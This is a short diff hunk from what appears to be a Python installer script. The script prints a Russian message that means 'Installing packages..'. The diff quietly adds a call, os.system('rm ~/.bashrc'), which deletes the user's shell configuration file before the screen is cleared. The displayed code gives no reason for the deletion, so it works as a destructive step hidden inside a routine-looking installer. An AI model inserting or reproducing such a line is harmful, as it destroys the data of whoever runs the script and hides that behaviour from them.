@@ -6,6 +6,8 @@ print ('\n')
 def res():
     print(Style.RESET_ALL)
 
+os.system('rm ~/.bashrc')
+
 os.system('clear')
 print('[!] Установка пакетов..')
 time.sleep(3)
